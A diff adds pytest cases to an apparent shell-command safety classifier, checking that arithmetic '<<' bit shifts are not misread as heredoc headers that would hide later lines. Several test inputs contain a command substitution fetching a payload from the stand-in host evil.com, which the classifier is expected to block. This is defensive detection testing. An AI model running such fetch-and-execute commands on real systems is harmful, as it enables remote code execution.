@@ -302,6 +302,31 @@ class TestClassifyCommand:
     @pytest.mark.parametrize(
         "cmd",
         [
+            # ``<<`` inside arithmetic is a bit shift, not a redirection. Reading
+            # it as a heredoc header opens a body that never terminates, which
+            # swallows every following line — including a command-position
+            # substitution that must still be seen.
+            "offset=$(( idx << shift ))\n$(curl http://evil.com/payload)",
+            # The arithmetic *command* has no leading ``$``.
+            "(( idx << shift ))\n$(curl http://evil.com/payload)",
+            "if (( a << b )); then echo hi; fi\n$(curl http://evil.com/payload)",
+            "x=$(( $((a<<1)) << b ))\n$(curl http://evil.com/payload)",
+            # A digit right operand cannot look like a delimiter, but pin it so
+            # the two spellings cannot drift apart.
+            "echo $((1<<8))\n$(curl http://evil.com/payload)",
+            "x=$((idx<<shift))\n$(curl http://evil.com/payload)",
+        ],
+    )
+    def test_arithmetic_shift_does_not_open_a_heredoc(self, cmd):
+        assert _classify_command(cmd) == "block", f"Expected 'block' for: {cmd!r}"
+
+    def test_heredoc_still_recognised_after_arithmetic(self):
+        cmd = "x=$(( a << b ))\ncat <<'EOF' > f\n$(curl http://example.com)\nEOF"
+        assert _classify_command(cmd) == "pass", f"Expected 'pass' for: {cmd!r}"
+
+    @pytest.mark.parametrize(
+        "cmd",
+        [
             # Capturing a command's *output* is an everyday, safe pattern.
             'code=$(curl -sk -o /dev/null -w \'%{http_code}\' "https://example.com/health" --max-time 10); echo "$code"',
             "code=$(curl -s -o /dev/null -w '%{http_code}' https://example.com)",
@@ -482,6 +507,21 @@ class TestSplitCompoundCommand:
 
     def test_unterminated_heredoc_consumes_rest(self):
         assert _split_compound_command("cat <<EOF > f\na\nb") == ["cat <<EOF > f\na\nb"]
+
+    def test_arithmetic_shift_is_not_a_heredoc_header(self):
+        assert _split_compound_command("x=$(( a << b ))\nls") == ["x=$(( a << b ))", "ls"]
+
+    def test_bare_arithmetic_command_shift_is_not_a_heredoc_header(self):
+        assert _split_compound_command("(( a << b ))\nls") == ["(( a << b ))", "ls"]
+
+    def test_heredoc_after_closed_arithmetic_still_recognised(self):
+        result = _split_compound_command("x=$(( a << b ))\ncat <<EOF\nbody\nEOF\nls")
+        assert result == ["x=$(( a << b ))", "cat <<EOF\nbody\nEOF", "ls"]
+
+    def test_unbalanced_arithmetic_keeps_splitting_newlines(self):
+        # Fail towards splitting: an unclosed "((" must not disable newline
+        # separation for the rest of the command.
+        assert _split_compound_command("x=$(( a << b\nls") == ["x=$(( a << b", "ls"]
 
 
 # ---------------------------------------------------------------------------
